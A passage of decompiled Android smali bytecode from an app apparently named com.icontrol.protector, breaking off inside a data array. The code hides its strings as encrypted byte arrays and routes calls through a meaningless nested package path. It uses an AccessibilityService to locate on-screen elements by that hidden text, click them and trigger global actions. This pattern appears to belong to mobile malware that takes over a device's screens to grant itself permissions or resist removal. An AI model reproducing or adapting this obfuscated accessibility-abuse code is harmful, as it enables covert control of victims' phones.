    move-result-object v2

    invoke-static {v0, v2}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_a

    new-array v2, v5, [B

    fill-array-data v2, :array_21

    new-array v15, v6, [B

    fill-array-data v15, :array_22

    invoke-static {v2, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_a

    const/16 v1, 0x2d

    new-array v1, v1, [B

    fill-array-data v1, :array_23

    new-array v2, v6, [B

    fill-array-data v2, :array_24

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_4

    new-array v1, v5, [B

    fill-array-data v1, :array_25

    new-array v2, v6, [B

    fill-array-data v2, :array_26

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :cond_a
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v2

    const/16 v5, 0x24

    if-ne v2, v11, :cond_b

    const/16 v2, 0x14

    new-array v2, v2, [B

    fill-array-data v2, :array_27

    new-array v15, v6, [B

    fill-array-data v15, :array_28

    invoke-static {v2, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_b

    new-array v2, v5, [B

    fill-array-data v2, :array_29

    new-array v15, v6, [B

    fill-array-data v15, :array_2a

    invoke-static {v2, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_b

    new-array v2, v5, [B

    fill-array-data v2, :array_2b

    new-array v15, v6, [B

    fill-array-data v15, :array_2c

    invoke-static {v2, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_b

    const/16 v1, 0x30

    new-array v1, v1, [B

    fill-array-data v1, :array_2d

    new-array v2, v6, [B

    fill-array-data v2, :array_2e

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_4

    new-array v1, v5, [B

    fill-array-data v1, :array_2f

    new-array v2, v6, [B

    fill-array-data v2, :array_30

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :cond_b
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v2

    const/4 v15, 0x6

    if-ne v2, v15, :cond_c

    new-array v2, v13, [B

    fill-array-data v2, :array_31

    new-array v15, v6, [B

    fill-array-data v15, :array_32

    invoke-static {v2, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_c

    new-array v2, v13, [B

    fill-array-data v2, :array_33

    new-array v15, v6, [B

    fill-array-data v15, :array_34

    invoke-static {v2, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_c

    new-array v1, v14, [B

    fill-array-data v1, :array_35

    new-array v2, v6, [B

    fill-array-data v2, :array_36

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_4

    new-array v1, v13, [B

    fill-array-data v1, :array_37

    new-array v2, v6, [B

    fill-array-data v2, :array_38

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :cond_c
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v2

    const/16 v15, 0xe

    if-ne v2, v15, :cond_e

    const/16 v2, 0x1c

    new-array v2, v2, [B

    fill-array-data v2, :array_39

    new-array v11, v6, [B

    fill-array-data v11, :array_3a

    invoke-static {v2, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_e

    new-array v2, v13, [B

    fill-array-data v2, :array_3b

    new-array v11, v6, [B

    fill-array-data v11, :array_3c

    invoke-static {v2, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_e

    new-array v2, v13, [B

    fill-array-data v2, :array_3d

    new-array v11, v6, [B

    fill-array-data v11, :array_3e

    invoke-static {v2, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_e

    const/16 v1, 0x2b

    new-array v1, v1, [B

    fill-array-data v1, :array_3f

    new-array v2, v6, [B

    fill-array-data v2, :array_40

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-nez v1, :cond_d

    const/16 v1, 0x34

    new-array v1, v1, [B

    fill-array-data v1, :array_41

    new-array v2, v6, [B

    fill-array-data v2, :array_42

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_4

    :cond_d
    new-array v1, v13, [B

    fill-array-data v1, :array_43

    new-array v2, v6, [B

    fill-array-data v2, :array_44

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :cond_e
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v2

    if-ne v2, v15, :cond_10

    sget-boolean v2, Lcom/icontrol/protector/h;->d:Z

    if-eqz v2, :cond_10

    new-array v2, v9, [B

    fill-array-data v2, :array_45

    new-array v9, v6, [B

    fill-array-data v9, :array_46

    invoke-static {v2, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_10

    new-array v1, v13, [B

    fill-array-data v1, :array_47

    new-array v2, v6, [B

    fill-array-data v2, :array_48

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_10

    new-array v1, v13, [B

    fill-array-data v1, :array_49

    new-array v2, v6, [B

    fill-array-data v2, :array_4a

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_10

    new-array v1, v8, [B

    fill-array-data v1, :array_4b

    new-array v2, v6, [B

    fill-array-data v2, :array_4c

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-nez v1, :cond_f

    const/16 v1, 0x33

    new-array v1, v1, [B

    fill-array-data v1, :array_4d

    new-array v2, v6, [B

    fill-array-data v2, :array_4e

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_4

    :cond_f
    new-array v1, v13, [B

    fill-array-data v1, :array_4f

    new-array v2, v6, [B

    fill-array-data v2, :array_50

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :cond_10
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v1

    if-ne v1, v10, :cond_11

    new-array v1, v13, [B

    fill-array-data v1, :array_51

    new-array v2, v6, [B

    fill-array-data v2, :array_52

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_11

    new-array v1, v13, [B

    fill-array-data v1, :array_53

    new-array v2, v6, [B

    fill-array-data v2, :array_54

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_11

    new-array v1, v14, [B

    fill-array-data v1, :array_55

    new-array v2, v6, [B

    fill-array-data v2, :array_56

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_4

    new-array v1, v13, [B

    fill-array-data v1, :array_57

    new-array v2, v6, [B

    fill-array-data v2, :array_58

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :cond_11
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v1

    const/4 v2, 0x4

    if-ne v1, v2, :cond_4

    new-array v1, v13, [B

    fill-array-data v1, :array_59

    new-array v2, v6, [B

    fill-array-data v2, :array_5a

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_12

    new-array v1, v13, [B

    fill-array-data v1, :array_5b

    new-array v2, v6, [B

    fill-array-data v2, :array_5c

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_12

    move v1, v4

    goto :goto_2

    :cond_12
    move v1, v7

    :goto_2
    new-array v2, v4, [B

    aput-byte v10, v2, v7

    new-array v8, v6, [B

    fill-array-data v8, :array_5d

    invoke-static {v2, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    sget-object v8, Lcom/icontrol/protector/My_Configs;->Draws_overs:Ljava/lang/String;

    invoke-virtual {v2, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_13

    if-eqz v1, :cond_4

    const/16 v1, 0x23

    new-array v1, v1, [B

    fill-array-data v1, :array_5e

    new-array v2, v6, [B

    fill-array-data v2, :array_5f

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_4

    new-array v1, v13, [B

    fill-array-data v1, :array_60

    new-array v2, v6, [B

    fill-array-data v2, :array_61

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :cond_13
    if-eqz v1, :cond_4

    new-array v1, v14, [B

    fill-array-data v1, :array_62

    new-array v2, v6, [B

    fill-array-data v2, :array_63

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_14

    invoke-static {v3, v1}, Lcom/icontrol/protector/h;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_14

    const/16 v1, 0x26

    new-array v1, v1, [B

    fill-array-data v1, :array_64

    new-array v2, v6, [B

    fill-array-data v2, :array_65

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_4

    new-array v1, v13, [B

    fill-array-data v1, :array_66

    new-array v2, v6, [B

    fill-array-data v2, :array_67

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :cond_14
    new-array v1, v5, [B

    fill-array-data v1, :array_68

    new-array v2, v6, [B

    fill-array-data v2, :array_69

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_4

    new-array v1, v13, [B

    fill-array-data v1, :array_6a

    new-array v2, v6, [B

    fill-array-data v2, :array_6b

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :goto_3
    if-eqz v0, :cond_1a

    const/16 v0, 0x10

    invoke-virtual {v2, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    invoke-static {v2, v0}, Lcom/icontrol/protector/h;->i(Landroid/view/accessibility/AccessibilityNodeInfo;I)Z

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    if-ne v0, v4, :cond_15

    invoke-static {v7}, Lcom/icontrol/protector/h;->g(Z)V

    goto :goto_6

    :cond_15
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    if-ne v0, v12, :cond_16

    sget-object v0, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v0, v12}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    invoke-static {v7}, Lcom/icontrol/protector/h;->e(Z)V

    goto :goto_6

    :cond_16
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v1, 0x3

    if-eq v0, v1, :cond_19

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    if-ne v0, v10, :cond_17

    goto :goto_5

    :cond_17
    sget-object v0, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v0, v12}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a7;->a()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x5

    new-array v1, v1, [B

    fill-array-data v1, :array_6c

    new-array v2, v6, [B

    fill-array-data v2, :array_6d

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_18

    sget-boolean v0, Lcom/icontrol/protector/h;->c:Z

    if-eqz v0, :cond_18

    :goto_4
    invoke-static {v7}, Lcom/icontrol/protector/h;->f(Z)V

    goto :goto_6

    :cond_18
    invoke-static {v7}, Lcom/icontrol/protector/h;->d(Z)V

    goto :goto_6

    :cond_19
    :goto_5
    sget-object v0, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v0, v12}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto :goto_4

    :goto_6
    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    :cond_1a
    :goto_7
    return-void

    :array_0
    .array-data 1
        -0x13t
        -0x27t
        -0x34t
        -0x27t
        0x75t
        -0x5dt
        0x30t
        -0x1ft
    .end array-data

    :array_1
    .array-data 1
        0x2t
        -0x74t
        0x73t
        -0x21t
        0x30t
        0x2at
        -0x21t
        0x3ft
        0x4t
        -0x76t
        0x30t
        -0x70t
        0x36t
        0x3bt
        -0x34t
        0x27t
        0x8t
        -0x79t
        0x30t
        -0x63t
        0x39t
        0x2at
        -0x30t
        0x2bt
        0x9t
        -0x7at
        0x6ct
    .end array-data

    :array_2
    .array-data 1
        0x61t
        -0x1dt
        0x1et
        -0xft
        0x58t
        0x5ft
        -0x42t
        0x48t
    .end array-data

    :array_3
    .array-data 1
        -0x24t
        -0x7t
        -0x37t
        -0x76t
        -0x1at
        0x26t
        0x6et
        -0x49t
        -0x2ct
        -0xdt
        -0x7et
        -0x66t
        -0x4t
        0x3bt
        0x7et
        -0x1et
        -0x2dt
        -0x5at
    .end array-data

    nop

    :array_4
    .array-data 1
        -0x43t
        -0x69t
        -0x53t
        -0x8t
        -0x77t
        0x4ft
        0xat
        -0x73t
    .end array-data

    :array_5
    .array-data 1
        0x3et
        -0x36t
        -0x52t
        -0x28t
        0x2ct
        0x79t
        0x4dt
        -0x69t
        0x36t
        -0x40t
        -0x1bt
        -0x38t
        0x36t
        0x64t
        0x5dt
        -0x3et
        0x31t
        -0x6at
    .end array-data

    nop

    :array_6
    .array-data 1
        0x5ft
        -0x5ct
        -0x36t
        -0x56t
        0x43t
        0x10t
        0x29t
        -0x53t
    .end array-data

    :array_7
    .array-data 1
        -0x68t
        0x2ft
        -0x27t
        0x41t
        0x4ct
        0x5ft
        0x5at
        -0x66t
        -0x62t
        0x29t
        -0x66t
        0xet
        0x4at
        0x4et
        0x49t
        -0x7et
        -0x6et
        0x24t
        -0x66t
        0x3t
        0x45t
        0x5ft
        0x55t
        -0x72t
        -0x6dt
        0x25t
        -0x3at
        0x55t
        0x4dt
        0x4et
        0x14t
        -0x77t
        -0x62t
        0x2ct
        -0x2ft
        0x1bt
        0x41t
        0x75t
        0x52t
        -0x67t
        -0x62t
        0x2dt
    .end array-data

    nop

    :array_8
    .array-data 1
        -0x5t
        0x40t
        -0x4ct
        0x6ft
        0x24t
        0x2at
        0x3bt
        -0x13t
    .end array-data

    :array_9
    .array-data 1
        -0x16t
        0x1dt
        -0xct
        -0x48t
        0x7t
        -0x5dt
        -0x56t
        -0x49t
        -0x1et
        0x17t
        -0x41t
        -0x58t
        0x1dt
